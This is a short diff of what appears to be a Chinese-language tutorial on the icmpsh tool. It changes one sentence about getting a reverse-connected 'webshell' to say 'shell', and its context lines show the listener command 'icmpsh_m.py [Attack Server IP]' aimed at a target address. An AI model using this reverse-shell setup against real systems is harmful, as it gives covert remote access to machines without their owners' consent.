@@ -29,4 +29,4 @@ ping [Attack Server IP]
 ```
 python2.7 icmpsh_m.py [Attack Server IP] *.*.*.109
 ```
-即可获取反连的webshell
+即可获取反连的shell
